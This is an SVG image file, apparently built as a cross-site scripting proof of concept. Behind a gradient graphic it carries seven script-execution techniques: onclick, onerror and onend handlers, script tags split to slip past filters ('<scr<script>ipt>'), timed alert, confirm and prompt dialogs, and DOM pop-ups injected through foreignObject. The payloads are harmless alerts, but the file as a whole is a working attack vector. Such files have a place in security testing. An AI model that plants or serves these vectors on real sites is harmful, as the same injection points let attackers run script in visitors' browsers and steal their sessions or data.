<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="400">
    <!-- Colorful Graphic -->
    <defs>
        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:rgb(255,0,0);stop-opacity:1" />
            <stop offset="100%" style="stop-color:rgb(0,255,255);stop-opacity:1" />
        </linearGradient>
        <radialGradient id="grad2" cx="50%" cy="50%" r="50%">
            <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1" />
            <stop offset="100%" style="stop-color:rgb(0,0,255);stop-opacity:1" />
        </radialGradient>
    </defs>
    <rect x="0" y="0" width="600" height="400" fill="url(#grad1)" stroke="black" stroke-width="3" />
    <circle cx="300" cy="200" r="100" fill="url(#grad2)" stroke="white" stroke-width="2" onclick="alert('XSS PoC: Clicked circle!');" />
    <text x="300" y="50" font-size="20" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Multiple Alerts (Click or Wait)</text>
    
    <!-- Technique 1: Standard Alert (Immediate) -->
    <scr<script>ipt>
        alert('XSS PoC: Standard alert triggered on load');
    </script>
    
    <!-- Technique 2: Confirm Dialog (After 2 seconds) -->
    <scr<script>ipt>
        setTimeout(() => {
            confirm('XSS PoC: Confirm dialog - click OK or Cancel');
        }, 2000);
    </script>
    
    <!-- Technique 3: Prompt Dialog (After 4 seconds) -->
    <scr<script>ipt>
        setTimeout(() => {
            prompt('XSS PoC: Prompt dialog - enter text', 'Type here');
        }, 4000);
    </sc<script>ript>
    
    <!-- Technique 4: Custom DOM-Based Pop-Up (After 6 seconds) -->
    <scr<script>ipt>
        setTimeout(() => {
            const popup = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
            popup.setAttribute('x', '150');
            popup.setAttribute('y', '100');
            popup.setAttribute('width', '300');
            popup.setAttribute('height', '100');
            const div = document.createElement('div');
            div.style.background = 'white';
            div.style.border = '2px solid black';
            div.style.padding = '10px';
            div.style.textAlign = 'center';
            div.innerHTML = 'XSS PoC: Custom DOM pop-up<br/><button onclick="this.parentNode.parentNode.remove()">Close</button>';
            popup.appendChild(div);
            document.querySelector('svg').appendChild(popup);
        }, 6000);
    </script>
    
    <!-- Technique 5: ForeignObject with HTML Pop-Up (After 8 seconds) -->
    <foreignObject x="150" y="220" width="300" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml">
            <script>
                setTimeout(() => {
                    const div = document.createElement('div');
                    div.style.background = 'yellow';
                    div.style.border = '2px solid red';
                    div.style.padding = '10px';
                    div.style.textAlign = 'center';
                    div.innerHTML = 'XSS PoC: HTML pop-up via foreignObject<br/><button onclick="this.parentNode.remove()">Close</button>';
                    document.body.appendChild(div);
                }, 8000);
            </script>
        </body>
    </foreignObject>
    
    <!-- Technique 6: Image with onerror Trigger -->
    <image xlink:href="invalid.png" x="0" y="0" width="1" height="1" onerror="alert('XSS PoC: Image onerror triggered');" />
    
    <!-- Technique 7: Animation with onend Trigger -->
    <circle cx="50" cy="50" r="20" fill="red">
        <animate attributeName="r" from="20" to="30" dur="2s" begin="10s" fill="freeze" onend="alert('XSS PoC: Animation onend triggered');" />
    </circle>
</svg>
